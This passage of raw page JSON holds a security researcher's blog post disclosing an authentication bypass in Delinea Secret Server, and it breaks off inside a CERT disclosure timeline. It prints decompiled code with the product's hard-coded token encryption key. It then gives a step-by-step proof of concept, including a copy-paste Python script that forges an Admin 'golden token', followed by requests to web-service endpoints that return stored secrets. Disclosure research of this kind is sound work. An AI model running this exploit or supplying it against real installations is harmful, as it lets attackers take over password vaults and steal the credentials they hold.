Thycotic.ihawu.Business.dll","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":72,"end":110,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":117,"end":135,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":145,"end":157,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":172,"end":199,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_15":{"__typename":"Paragraph","id":"033f6a1b9b22_15","name":"3158","type":"PRE","href":null,"layout":null,"metadata":null,"text":"... snipped ...\n authenticationTicket = this._oAuthAuthOptions.AccessTokenFormat.Unprotect(encryptedToken);\n num = (short)883621889;\n num2 = (int)((IntPtr)num);\n continue;\n... snipped ...","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_16":{"__typename":"Paragraph","id":"033f6a1b9b22_16","name":"1418","type":"P","href":null,"layout":null,"metadata":null,"text":"The IsValidToken function will first deserialize the API token by calling the Thycotic.Identity.Formatters NS -\u003E SecureTokenFormatter class -\u003E Unprotect function from Thycotic.Identity.dll. The deserialization comprise of the following steps:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":78,"end":106,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":113,"end":133,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":143,"end":152,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":167,"end":189,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_17":{"__typename":"Paragraph","id":"033f6a1b9b22_17","name":"3e11","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Base64 decode incoming string (API token)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_18":{"__typename":"Paragraph","id":"033f6a1b9b22_18","name":"ff21","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Decrypt the decoded string (API token)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_19":{"__typename":"Paragraph","id":"033f6a1b9b22_19","name":"83bb","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Deserialize the decrypted content into a Microsoft.Owin.Security.AuthenticationTicket object","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":41,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_20":{"__typename":"Paragraph","id":"033f6a1b9b22_20","name":"990a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"public AuthenticationTicket Unprotect(string text)\n  {\n   byte[] protectedData = this._encoder.Decode(text);\n   byte[] data = this._protector.Unprotect(protectedData);\n   return this._serializer.Deserialize(data);\n  }","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_21":{"__typename":"Paragraph","id":"033f6a1b9b22_21","name":"66e7","type":"P","href":null,"layout":null,"metadata":null,"text":"The first discovery resides in the Unprotect function, where it decrypts the API token with a hard-coded key.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":35,"end":44,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_22":{"__typename":"Paragraph","id":"033f6a1b9b22_22","name":"debb","type":"P","href":null,"layout":null,"metadata":null,"text":"The Unprotect function is located in Thycotic.Identity.dll -\u003E Thycotic.Identity.Protectors NS -\u003E ThycoticDataProtector class.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":37,"end":59,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":61,"end":91,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":96,"end":118,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_23":{"__typename":"Paragraph","id":"033f6a1b9b22_23","name":"7889","type":"PRE","href":null,"layout":null,"metadata":null,"text":"public byte[] Unprotect(byte[] protectedData)\n{\nbyte[] key = this._keyProvider.GetKey();\nif (key == null)\n{\nthrow new SecurityException(\"Invalid Key\");\n}\nbyte[] first = protectedData.Take(2).ToArray\u003Cbyte\u003E();\n... snipped ...","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_24":{"__typename":"Paragraph","id":"033f6a1b9b22_24","name":"f227","type":"P","href":null,"layout":null,"metadata":null,"text":"The call to _keyProvider.GetKey() leads to the following:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":11,"end":33,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_25":{"__typename":"Paragraph","id":"033f6a1b9b22_25","name":"9a95","type":"PRE","href":null,"layout":null,"metadata":null,"text":"namespace Thycotic.Identity.Providers\n{\n\u002F\u002F Token: 0x02000009 RID: 9\npublic class KeyProvider : IKeyProvider\n{\n\u002F\u002F Token: 0x06000017 RID: 23 RVA: 0x000021CA File Offset: 0x000003CA\npublic byte[] GetKey()\n{\nreturn new byte[]\n{\n94,\n236,\n230,\n169,\n211,\n147,\n133,\n245,\n121,\n91,\n206,\n177,\n186,\n5,\n69,\n44,\n76,\n117,\n133,\n146,\n11,\n237,\n91,\n37,\n252,\n151,\n171,\n17,\n83,\n67,\n193,\n141\n};\n}\n}\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_26":{"__typename":"Paragraph","id":"033f6a1b9b22_26","name":"b5de","type":"P","href":null,"layout":null,"metadata":null,"text":"The uncovering of hard-coded key served as a motivator to investigate the rest of the API token checking mechanism.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_27":{"__typename":"Paragraph","id":"033f6a1b9b22_27","name":"165b","type":"P","href":null,"layout":null,"metadata":null,"text":"When the API token is deserialized into a Microsoft.Owin.Security.AuthenticationTicket object, the next step in the IsValidToken function is to retrieve the user profile from it.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":42,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":116,"end":128,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_28":{"__typename":"Paragraph","id":"033f6a1b9b22_28","name":"058f","type":"PRE","href":null,"layout":null,"metadata":null,"text":"... snipped ...\nIL_291:\nuser = this._owinClaimHelper.GetUser(authenticationTicket.Identity.Claims);\nnum = (short)235012100;\nnum2 = (int)((IntPtr)num);\n... snipped ...","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_29":{"__typename":"Paragraph","id":"033f6a1b9b22_29","name":"98ea","type":"P","href":null,"layout":null,"metadata":null,"text":"The GetUser function is located in Thycotic.ihawu.Business.Authentication NS -\u003E OwinClaimHelper class under Thycotic.ihawu.Business.dll, and this logic retrieves the user profile from the nameidentifier property which holds an Integer string.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":35,"end":73,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":80,"end":95,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":108,"end":135,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":188,"end":202,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*0XqH9Xm6eCkQGBDDiWO9Ig.png":{"__typename":"ImageMetadata","id":"1*0XqH9Xm6eCkQGBDDiWO9Ig.png","originalHeight":936,"originalWidth":2344,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:033f6a1b9b22_30":{"__typename":"Paragraph","id":"033f6a1b9b22_30","name":"ee92","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*0XqH9Xm6eCkQGBDDiWO9Ig.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_31":{"__typename":"Paragraph","id":"033f6a1b9b22_31","name":"63b1","type":"P","href":null,"layout":null,"metadata":null,"text":"Through dynamic analysis, I observed every user profile is represented with an Integer value in consecutive order. Integer 2 is always the Admin user (note: This user profile gets create as part of the installation of the application).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":123,"end":124,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":139,"end":144,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":151,"end":156,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_32":{"__typename":"Paragraph","id":"033f6a1b9b22_32","name":"1ff8","type":"P","href":null,"layout":null,"metadata":null,"text":"The attack path is starting to take shape. If we know the hard-coded key to deserializing the API token and we know the Integer value associated with the Admin profile, we should be able to craft a serialized API token with Admin role, and net access to any Delinea Secret Server’s protected resources through the web services API.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_33":{"__typename":"Paragraph","id":"033f6a1b9b22_33","name":"875f","type":"P","href":null,"layout":null,"metadata":null,"text":"The story is not complete without encountering and getting pass roadblock. I encountered a hurdle in this section of the IsValidToken function:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":121,"end":133,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_34":{"__typename":"Paragraph","id":"033f6a1b9b22_34","name":"ddd5","type":"PRE","href":null,"layout":null,"metadata":null,"text":"... snipped ..\nClaim claim;\nGuid oauthExpirationId = new Guid(claim.Value);\noauthExpiration = this._oAuthExpirationService.Load(oauthExpirationId);\nnum = (short)455344133;\nnum2 = (int)((IntPtr)num);\n... snipped ...","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"csharp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_35":{"__typename":"Paragraph","id":"033f6a1b9b22_35","name":"8c35","type":"P","href":null,"layout":null,"metadata":null,"text":"The oauthExpirationId property is accessible through Microsoft.Owin.Security.AuthenticationTicket object, and this property contains a UUIDv4 value that gets generated per user authentication. For example, when user Admin authenticates through the web UI, an AuthenticationTicket object is created along with a timestamp that is stored in the application cache. When a user access a web service with an API token, the deserialized AuthenticationTicket object will use the UUIDv4 value stored in oauthExpirationId to reference the timestamp in application cache to determine when the associated AuthenticationTicket object was created. This is to ensure an API token is tied to an authenticated user.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":53,"end":97,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":259,"end":279,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":431,"end":451,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":495,"end":512,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":594,"end":615,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*RctpIUcb5xkGvnPBNR9uhg.png":{"__typename":"ImageMetadata","id":"1*RctpIUcb5xkGvnPBNR9uhg.png","originalHeight":938,"originalWidth":2347,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:033f6a1b9b22_36":{"__typename":"Paragraph","id":"033f6a1b9b22_36","name":"8428","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RctpIUcb5xkGvnPBNR9uhg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_37":{"__typename":"Paragraph","id":"033f6a1b9b22_37","name":"86c5","type":"P","href":null,"layout":null,"metadata":null,"text":"This puts a stop towards the attack path because there is no way to determine a valid UUIDv4 value generated by the application. The goal of crafting a AuthN\u002FAuthZ bypass vanished.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_38":{"__typename":"Paragraph","id":"033f6a1b9b22_38","name":"7dcb","type":"P","href":null,"layout":null,"metadata":null,"text":"While I encountered setback, what is the next best thing I can do? It turns out the UUIDv4 value does not have any association with a user profile. So user Alice can use user Bob’s oauthExpirationId UUIDv4 value as long as the referenced timestamp have not expired. I was able to figured this out by editing the values manually with the DnSpy debugger. This gives an avenue for a Local Privilege Escalation path:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":181,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_39":{"__typename":"Paragraph","id":"033f6a1b9b22_39","name":"6828","type":"OLI","href":null,"layout":null,"metadata":null,"text":"A low privileged user (Bob) authenticates to the application and collect its API token.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_40":{"__typename":"Paragraph","id":"033f6a1b9b22_40","name":"3f1d","type":"P","href":null,"layout":null,"metadata":null,"text":"2. Bob examines its API token and extract the oauthExpirationId value.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":46,"end":63,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_41":{"__typename":"Paragraph","id":"033f6a1b9b22_41","name":"3347","type":"P","href":null,"layout":null,"metadata":null,"text":"3. Bob crafts an Admin privileged AuthenticationTicket with the nameidentifer property set to 2, and the oauthExpirationId it had from its original API token, and finishes off with encrypting and serializing the AuthenticationTicket into an API token with the hard-coded key.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":34,"end":54,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":64,"end":77,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":94,"end":95,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":105,"end":122,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":212,"end":233,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_42":{"__typename":"Paragraph","id":"033f6a1b9b22_42","name":"c8ae","type":"P","href":null,"layout":null,"metadata":null,"text":"This is a pretty good attack path, but I wasn’t satisfy with the result. My instinct tells me there should be a way with getting a full AuthN\u002FAuthZ bypass, and I should not settle for a LPE.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_43":{"__typename":"Paragraph","id":"033f6a1b9b22_43","name":"fc81","type":"P","href":null,"layout":null,"metadata":null,"text":"The final discovery that led to a full AuthN\u002FAuthZ bypass for any Delinea Secret Server is very simple and was something I overlooked. It turns out if I remove the oauthExpirationId attribute from the AuthenticationTicket object, the timestamp check will not get invoked!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":164,"end":181,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":201,"end":222,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_44":{"__typename":"Paragraph","id":"033f6a1b9b22_44","name":"0965","type":"P","href":null,"layout":null,"metadata":null,"text":"Coincidentally after my discovery, Delinea released version 11.6.000025 of their Secret Server, which still have the security issues described in this blog post.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":60,"end":71,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_45":{"__typename":"Paragraph","id":"033f6a1b9b22_45","name":"bb70","type":"P","href":null,"layout":null,"metadata":null,"text":"3\u002F28\u002F2024 Update: Delinea Secret Server latest version 11.7.000000 is vulnerable as well.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":55,"end":67,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_46":{"__typename":"Paragraph","id":"033f6a1b9b22_46","name":"40fd","type":"P","href":null,"layout":null,"metadata":null,"text":"PoC || GTFO","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_47":{"__typename":"Paragraph","id":"033f6a1b9b22_47","name":"1e89","type":"P","href":null,"layout":null,"metadata":null,"text":"1. Download Delinea Secret Server and install it (https:\u002F\u002Fsupport.delinea.com\u002Fs\u002Fdownload-onprem) — to use their DLL files.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":50,"end":95,"href":"https:\u002F\u002Fsupport.delinea.com\u002Fs\u002Fdownload-onprem","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":50,"end":95,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_48":{"__typename":"Paragraph","id":"033f6a1b9b22_48","name":"3d4e","type":"P","href":null,"layout":null,"metadata":null,"text":"2. Install python, for my instance, python is installed to C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python312\\python.exe","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":59,"end":132,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_49":{"__typename":"Paragraph","id":"033f6a1b9b22_49","name":"9020","type":"P","href":null,"layout":null,"metadata":null,"text":"3. Install pythonnet, which allows python to talk to .NET: C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python312\\python.exe -m pip install pythonnet","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":11,"end":20,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":59,"end":157,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_50":{"__typename":"Paragraph","id":"033f6a1b9b22_50","name":"1cbf","type":"P","href":null,"layout":null,"metadata":null,"text":"4. Open cmd.exe and go to C:\\inetpub\\wwwroot\\SecretServer\\bin","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":8,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":26,"end":61,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_51":{"__typename":"Paragraph","id":"033f6a1b9b22_51","name":"1a2f","type":"P","href":null,"layout":null,"metadata":null,"text":"5. Run C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python312\\python.exe under C:\\inetpub\\wwwroot\\SecretServer\\bin","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":7,"end":80,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":87,"end":122,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_52":{"__typename":"Paragraph","id":"033f6a1b9b22_52","name":"4644","type":"P","href":null,"layout":null,"metadata":null,"text":"6. Copy & Paste the following python code into Python interpreter to generate the Golden token:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_53":{"__typename":"Paragraph","id":"033f6a1b9b22_53","name":"ad0b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"import clr\nclr.AddReference(\"Thycotic.Identity\")\nclr.AddReference(\"Microsoft.Owin.Security\")\nimport sys\nfrom System import *\nfrom System.Security.Claims import *\nfrom Microsoft.Owin.Security import *\nfrom Thycotic.Identity.Providers import *\nfrom Thycotic.Identity.Formatters import *\nfrom Thycotic.Identity.Protectors import *\n\ndef buildToken(id):\n   claimsIdentity = ClaimsIdentity(\"ExternalBearer\", \"http:\u002F\u002Fschemas.xmlsoap.org\u002Fws\u002F2005\u002F05\u002Fidentity\u002Fclaims\u002Fname\", \"http:\u002F\u002Fschemas.microsoft.com\u002Fws\u002F2008\u002F06\u002Fidentity\u002Fclaims\u002Frole\")\n   claimsIdentity.AddClaim(Claim(\"http:\u002F\u002Fschemas.xmlsoap.org\u002Fws\u002F2005\u002F05\u002Fidentity\u002Fclaims\u002Fnameidentifier\", str(id), \"http:\u002F\u002Fwww.w3.org\u002F2001\u002FXMLSchema#integer\", \"Thycotic.Identity\", \"Thycotic.Identity\"))\n   properties = AuthenticationProperties()\n   properties.IssuedUtc = DateTimeOffset.UtcNow.Add(TimeSpan(0,0,0,0))\n   properties.IsPersistent = False\n   authenticationTicket = AuthenticationTicket(claimsIdentity, properties)\n   keyProvider = KeyProvider()\n   dataProtector = ThycoticDataProtector(keyProvider)\n   secureTokenFormatter = SecureTokenFormatter(dataProtector)\n   token = secureTokenFormatter.Protect(authenticationTicket)\n   return token\n\nbuildToken(2)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_54":{"__typename":"Paragraph","id":"033f6a1b9b22_54","name":"14d8","type":"P","href":null,"layout":null,"metadata":null,"text":"7. Browse to http:\u002F\u002F\u003Ctarget\u003E\u002FSecretServer\u002Fwebservices\u002FSSWebService.asmx?op=WhoAmI and paste the token into the POST field and observe the Admin profile is returned. note: \u003Ctarget\u003E can be localhost","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":13,"end":81,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":138,"end":143,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":165,"end":170,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":165,"end":170,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_55":{"__typename":"Paragraph","id":"033f6a1b9b22_55","name":"22b9","type":"P","href":null,"layout":null,"metadata":null,"text":"8.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_56":{"__typename":"Paragraph","id":"033f6a1b9b22_56","name":"d3ff","type":"P","href":null,"layout":null,"metadata":null,"text":"For more serious impact:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_57":{"__typename":"Paragraph","id":"033f6a1b9b22_57","name":"c573","type":"P","href":null,"layout":null,"metadata":null,"text":"Make a SOAP request to http:\u002F\u002F\u003Ctarget\u003E\u002FSecretServer\u002Fwebservices\u002FSSWebService.asmx?op=SearchSecrets — to obtain stored secrets","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":23,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_58":{"__typename":"Paragraph","id":"033f6a1b9b22_58","name":"db2f","type":"P","href":null,"layout":null,"metadata":null,"text":"Disclosure Timeline","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":19,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_59":{"__typename":"Paragraph","id":"033f6a1b9b22_59","name":"ed49","type":"P","href":null,"layout":null,"metadata":null,"text":"2\u002F12\u002F2024 — I sent an email to Delinea, and their response stated that I am ineligible to open a case since I am not affiliated with a paying customer\u002Forganization.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_60":{"__typename":"Paragraph","id":"033f6a1b9b22_60","name":"6498","type":"P","href":null,"layout":null,"metadata":null,"text":"02\u002F12\u002F2024 — I reached out to CERT to coordinate responsible disclosure with Delinea. CERT opened case VU#979120","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_61":{"__typename":"Paragraph","id":"033f6a1b9b22_61","name":"ae58","type":"P","href":null,"layout":null,"metadata":null,"text":"02\u002F16\u002F2024 — Status update from CERT noted Delinea did not respond","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_62":{"__typename":"Paragraph","id":"033f6a1b9b22_62","name":"1b92","type":"P","href":null,"layout":null,"metadata":null,"text":"02\u002F23\u002F2024 — Status update from CERT noted Delinea did not respond","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_63":{"__typename":"Paragraph","id":"033f6a1b9b22_63","name":"3357","type":"P","href":null,"layout":null,"metadata":null,"text":"03\u002F05\u002F2024 — Status update from CERT noted Delinea did not respond","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_64":{"__typename":"Paragraph","id":"033f6a1b9b22_64","name":"2153","type":"P","href":null,"layout":null,"metadata":null,"text":"03\u002F18\u002F2024 — Status update from CERT noted Delinea did not respond. CERT extended disclosure deadline to 